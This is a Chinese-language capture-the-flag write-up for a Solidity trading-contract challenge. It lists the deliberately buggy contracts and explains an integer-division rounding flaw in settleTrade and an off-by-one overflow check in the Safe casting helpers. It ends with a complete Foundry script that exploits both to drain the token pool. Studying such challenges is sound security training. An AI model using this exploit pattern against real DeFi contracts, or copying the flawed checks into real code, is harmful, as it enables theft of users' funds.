源码：`Setup.sol`&`ERC20.sol`&`Safe.sol`&`Capital_prevails`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
import "./Capital_prevails.sol";
contract Setup {
    Capital_prevails public capital_prevails;
    SimpleERC20 public rweb;
    SimpleERC20 public weth;
    address public constant proletariat = address(0xc0ffee);
    constructor() {
        capital_prevails = new Capital_prevails();
        weth = new SimpleERC20("Wrapped Ether", "WETH", 18, 10 ether);
        rweb = new SimpleERC20("RWeb Token", "RWEBT", 18, 10 ether);
        rweb.approve(address(capital_prevails), 10 ether);
        capital_prevails.createTrade(
            address(rweb),
            address(weth),
            10 ether,
            1 ether
        );
    }
    function isSolved() public view returns (bool) {
        return rweb.balanceOf(proletariat) >= 10 ether;
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

contract SimpleERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
    }

    function transfer(address _to, uint256 _value) external returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) external returns (bool) {
        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(
            allowance[_from][msg.sender] >= _value,
            "Insufficient allowance"
        );

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);
        return true;
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Safe {
    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
    function safeCast(uint256 value) internal pure returns (uint112) {
        require(value <= (1 << 112), "Safe: value exceeds uint112 max");
        return uint112(value);
    }

    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {
        require(
            uint256(a) * b <= (1 << 112),
            "Safe: value exceeds uint112 max"
        );
        return uint112(a * b);
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./ERC20.sol";
import "./Safe.sol";

contract Capital_prevails is Safe {
    struct Trade {
        address maker;
        address taker;
        address tokenToSell;
        address tokenToBuy;
        uint112 amountToSell;
        uint112 amountToBuy;
        uint112 filledAmountToSell;
        uint112 filledAmountToBuy;
        bool isActive;
    }

    mapping(uint256 => Trade) public trades;
    uint256 public nextTradeId;
    bool private locked;
    uint256 public fee = 30 wei;

    event TradeCreated(
        uint256 indexed tradeId,
        address indexed maker,
        address tokenToSell,
        address tokenToBuy,
        uint256 amountToSell,
        uint256 amountToBuy
    );
    event TradeSettled(
        uint256 indexed tradeId,
        address indexed settler,
        uint256 settledAmountToSell
    );
    event TradeCancelled(uint256 indexed tradeId);

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function createTrade(
        address _tokenToSell,
        address _tokenToBuy,
        uint256 _amountToSell,
        uint256 _amountToBuy
    ) external nonReentrant {
        require(
            _tokenToSell != address(0) && _tokenToBuy != address(0),
            "Invalid token addresses"
        );

        uint256 tradeId = nextTradeId++;
        trades[tradeId] = Trade({
            maker: msg.sender,
            taker: address(0),
            tokenToSell: _tokenToSell,
            tokenToBuy: _tokenToBuy,
            amountToSell: safeCast(_amountToSell - fee),//
            amountToBuy: safeCast(_amountToBuy),
            filledAmountToSell: 0,
            filledAmountToBuy: 0,
            isActive: true
        });

        require(
            IERC20(_tokenToSell).transferFrom(
                msg.sender,
                address(this),
                _amountToSell
            ),
            "Transfer failed"
        );

        emit TradeCreated(
            tradeId,
            msg.sender,
            _tokenToSell,
            _tokenToBuy,
            _amountToSell,
            _amountToBuy
        );
    }

    function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {
        require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active");
        require(scale > 0, "Invalid scale");
        require(trade.filledAmountToBuy == 0, "Trade is already filled");
        uint112 originalAmountToSell = trade.amountToSell;
        trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));
        trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));
        uint256 newAmountNeededWithFee = safeCast(
            safeMul(originalAmountToSell, scale) + fee
        );
        if (originalAmountToSell < newAmountNeededWithFee) {
            require(
                IERC20(trade.tokenToSell).transferFrom(
                    msg.sender,
                    address(this),
                    newAmountNeededWithFee - originalAmountToSell
                ),
                "Transfer failed"
            );
        }
    }

    function settleTrade(
        uint256 _tradeId,
        uint256 _amountToSettle
    ) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active");
        require(_amountToSettle > 0, "Invalid settlement amount");
        uint256 tradeAmount = _amountToSettle * trade.amountToBuy;

        require(
            trade.filledAmountToSell + _amountToSettle <= trade.amountToSell,
            "Exceeds available amount"
        );

        require(
            IERC20(trade.tokenToBuy).transferFrom(
                msg.sender,
                trade.maker,
                tradeAmount / trade.amountToSell
            ),
            "Buy transfer failed"
        );
        require(
            IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle),
            "Sell transfer failed"
        );

        trade.filledAmountToSell += safeCast(_amountToSettle);
        trade.filledAmountToBuy += safeCast(tradeAmount / trade.amountToSell);

        if (trade.filledAmountToSell > trade.amountToSell) {
            trade.isActive = false;
        }

        emit TradeSettled(_tradeId, msg.sender, _amountToSettle);
    }

    function cancelTrade(uint256 _tradeId) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(msg.sender == trade.maker, "Only maker can cancel");
        require(trade.isActive, "Trade is not active");

        uint256 remainingAmount = trade.amountToSell - trade.filledAmountToSell;
        if (remainingAmount > 0) {
            require(
                IERC20(trade.tokenToSell).transfer(
                    trade.maker,
                    remainingAmount
                ),
                "Transfer failed"
            );
        }

        trade.isActive = false;

        emit TradeCancelled(_tradeId);
    }

    function getTrade(
        uint256 _tradeId
    )
        external
        view
        returns (
            address maker,
            address taker,
            address tokenToSell,
            address tokenToBuy,
            uint256 amountToSell,
            uint256 amountToBuy,
            uint256 filledAmountToSell,
            uint256 filledAmountToBuy,
            bool isActive
        )
    {
        Trade storage trade = trades[_tradeId];
        return (
            trade.maker,
            trade.taker,
            trade.tokenToSell,
            trade.tokenToBuy,
            trade.amountToSell,
            trade.amountToBuy,
            trade.filledAmountToSell,
            trade.filledAmountToBuy,
            trade.isActive
        );
    }
}
```

目标是让这个地址`proletariat`的`rweb`代币余额大于10ether

在`settleTrade`函数中，它的`transferFrom`里面有一个除法，因为是整数除法，所以如果被除数小于除数就等于0，因此不花钱就可以获得代币

在合约`Safe`中，两个检查都是有问题的，它的目的是为了让value都小于uint112的最大值，但实际上(1<<112)比uint112的最大值还大，如果我传入(1<<112)，那么返回值就会溢出

我们利用这两个漏洞进行攻击：

1. 调用`settleTrade`，传入0和9，在合约`Setup`中发起了第0笔交易，因此第一个参数传入0，第二个参数需要*1ether之后小于10ether，所以我选择传入9，尽可能大限度的嫖`rweb`，用于后面的发起交易
2. 接下来发起交易用31wei的`rweb`换0的`weth`，选择31一是因为发起交易需要30wei的手续费，二是为了方便后面的计算
3. 上面每笔嫖到了9wei，所以做4次循环，获得36wei，大于31wei
4. 调用`scaleTrade`函数，里面用到了检查的漏洞，`safeCast(safeMul(originalAmountToSell, scale) + fee)`，因为传入的31，所以`originalAmountToSell`的值为1，所以我们让`scale`的值为`(1 << 112) - 30`，这样就会发生溢出，放大了这笔交易
5. 最后调用`settleTrade`把里面的`rweb`都转出来，再把10ether转给`proletariat`

脚本：`Hack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "../src/Setup.sol";
import {Capital_prevails} from "../src/Capital_prevails.sol";
import {IERC20, SimpleERC20} from "../src/ERC20.sol";

contract POC is Script {
    Setup setup = Setup(0x9E3eCfe7fCf3d4B50eB4E942eE0F622324a66852);
    Capital_prevails target = setup.capital_prevails();
    address rweb = address(setup.rweb());
    address weth = address(setup.weth());

    function run() external {
        vm.startBroadcast();

        for(uint i = 0; i < 4; i++) {
            target.settleTrade(0, 9);
            console.log(IERC20(rweb).balanceOf(msg.sender));
        }
        IERC20(rweb).approve(address(target), type(uint256).max);
        target.createTrade(rweb, weth, 31, 0);
        uint256 scale = uint256((1 << 112) - 30);
        console.log("Scale:", scale);
        target.scaleTrade(1, scale);
        target.settleTrade(1, IERC20(rweb).balanceOf(address(target)));
        IERC20(rweb).transfer(setup.proletariat(), 10 ether);
        console.log(SimpleERC20(rweb).balanceOf(address(setup.proletariat())));
        console.log("Is Solved?", setup.isSolved());

        vm.stopBroadcast();
    }
}
```

